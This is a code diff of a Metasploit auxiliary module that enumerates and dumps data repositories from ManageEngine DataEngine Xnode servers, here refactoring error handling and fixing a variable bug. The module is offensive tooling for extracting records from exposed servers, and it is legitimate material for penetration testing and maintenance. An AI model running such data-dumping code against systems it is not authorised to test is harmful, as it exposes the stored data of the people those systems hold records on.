@@ -4,7 +4,7 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Auxiliary::ManageengineXnode
+  include Msf::Auxiliary::ManageEngineXnode
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::Tcp
   prepend Msf::Exploit::Remote::AutoCheck
@@ -93,13 +93,13 @@ class MetasploitModule < Msf::Auxiliary
       # create a socket
       res_code, sock_or_msg = create_socket_for_xnode(rhost, rport)
       if res_code == 1
-        fail_with(Failure::Unreachable, 'Failed to establish a connection with the remote server')
+        fail_with(Failure::Unreachable, sock_or_msg)
       end
       @sock = sock_or_msg
     end
 
     # get the Xnode health status
-    health_warning_message = ['Received unexpected response while trying to obtain the Xnode "de_health" status. Enumeration may not work.']
+    health_warning_message = 'Received unexpected response while trying to obtain the Xnode "de_health" status. Enumeration may not work.'
     res_code, res_health = get_response(@sock, action_admin_health, health_warning_message, 'de_health')
 
     if res_code == 0
@@ -111,7 +111,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # get the Xnode info
-    info_warning_message = ['Received unexpected response while trying to obtain the Xnode version and installation path via the "xnode_info" action. Enumeration may not work.']
+    info_warning_message = 'Received unexpected response while trying to obtain the Xnode version and installation path via the "xnode_info" action. Enumeration may not work.'
     res_code, res_info = get_response(@sock, action_xnode_info, info_warning_message)
 
     if res_code == 0
@@ -134,22 +134,22 @@ class MetasploitModule < Msf::Auxiliary
       # send a general query, which should return the "total_hits" parameter that represents the total record count
       res_code, res = get_response(@sock, action_dr_search(repo))
       total_hits = process_dr_search(res, res_code, repo, ['UNIQUE_ID'], 'total_hits')
-      # check if total_hits is an Integer, as that means process_dr_search returned an error code and we should skip to the next repo
-      next if total_hits.is_a?(Integer)
+      # check if total_hits is nil, as that means process_dr_search failed and we should skip to the next repo
+      next if total_hits.nil?
 
       # use "aggr" with the "min" specification for the UNIQUE_ID field in order to obtain the minimum value for this field, i.e. the oldest available record
       aggr_min_query = { 'aggr' => { 'min' => { 'field' => 'UNIQUE_ID' } } }
       res_code, res = get_response(@sock, action_dr_search(repo, ['UNIQUE_ID'], aggr_min_query))
       aggr_min = process_dr_search(res, res_code, repo, ['UNIQUE_ID'], 'aggr_min')
-      # check if aggr_min is an Integer, as that means process_dr_search returned an error code and we should skip to the next repo
-      next if aggr_min.is_a?(Integer)
+      # check if aggr_min is nil, as that means process_dr_search failed and we should skip to the next repo
+      next if aggr_min.nil?
 
       # use "aggr" with the "max" specification for the UNIQUE_ID field in order to obtain the maximum value for this field, i.e. the most recent record
       aggr_max_query = { 'aggr' => { 'max' => { 'field' => 'UNIQUE_ID' } } }
       res_code, res = get_response(@sock, action_dr_search(repo, ['UNIQUE_ID'], aggr_max_query))
       aggr_max = process_dr_search(res, res_code, repo, ['UNIQUE_ID'], 'aggr_max')
-      # check if aggr_max is an Integer, as that means process_dr_search returned an error code and we should skip to the next repo
-      next if aggr_min.is_a?(Integer)
+      # check if aggr_max is nil, as that means process_dr_search failed and we should skip to the next repo
+      next if aggr_max.nil?
 
       print_good("Data repository #{repo} contains #{total_hits} records with ID numbers between #{aggr_min} and #{aggr_max}.")
 
@@ -169,13 +169,13 @@ class MetasploitModule < Msf::Auxiliary
       data_to_dump = grab_config(config_file)
 
       case data_to_dump
-      when 1
+      when config_status::CONFIG_FILE_DOES_NOT_EXIST
         fail_with(Failure::BadConfig, "Unable to obtain the Xnode data repositories to target from #{config_file} because this file does not exist. Please correct your 'CONFIG_FILE' setting or set 'DUMP_ALL' to true.")
-      when 2
+      when config_status::CANNOT_READ_CONFIG_FILE
         fail_with(Failure::BadConfig, "Unable to read #{config_file}. Check if your 'CONFIG_FILE' setting is correct and make sure the file is readable and properly formatted.")
-      when 3
+      when config_status::DATA_TO_DUMP_EMPTY
         fail_with(Failure::BadConfig, "The #{config_file} does not seem to contain any data repositories and fields to dump. Please fix your configuration or set 'DUMP_ALL' to true.")
-      when 4
+      when config_status::DATA_TO_DUMP_WRONG_FORMAT
         fail_with(Failure::BadConfig, "Unable to obtain the Xnode data repositories to target from #{config_file}. Check if your 'CONFIG_DIR' setting is correct or set 'DUMP_ALL' to true.")
       end
     end
@@ -213,13 +213,13 @@ class MetasploitModule < Msf::Auxiliary
         id_range_upper += 10
         if id_range_upper > max_id
           if hit_upper_limit
-            results += partial_results unless partial_results.is_a?(Integer)
+            results += partial_results unless partial_results.nil?
             break
           end
           hit_upper_limit = true
           id_range_upper = max_id
         end
-        next if partial_results.is_a?(Integer)
+        next if partial_results.nil?
 
         results += partial_results
       end
